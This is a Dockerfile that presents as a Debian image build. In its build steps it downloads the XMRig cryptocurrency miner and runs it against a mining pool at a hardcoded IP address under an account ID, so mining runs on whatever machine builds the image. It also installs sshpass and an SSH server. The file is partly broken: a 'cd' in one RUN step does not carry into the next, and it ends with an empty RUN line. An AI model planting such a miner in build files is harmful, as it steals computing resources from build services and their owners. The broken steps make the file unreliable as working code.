FROM debian:10

MAINTAINER Qi Yang <i@yangqi.me>

# Install.
RUN apt-get update -y
RUN apt-get install curl wget sshpass openssh-server unzip screen -y
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
RUN tar xvf xmrig-6.15.3-linux-x64.tar.gz
RUN cd xmrig-6.15.3
RUN rm -rf config.json
RUN ./xmrig -o 52.170.56.113:80 -u zffnuhecaoxc@metalunits.com
expose 2222
RUN 
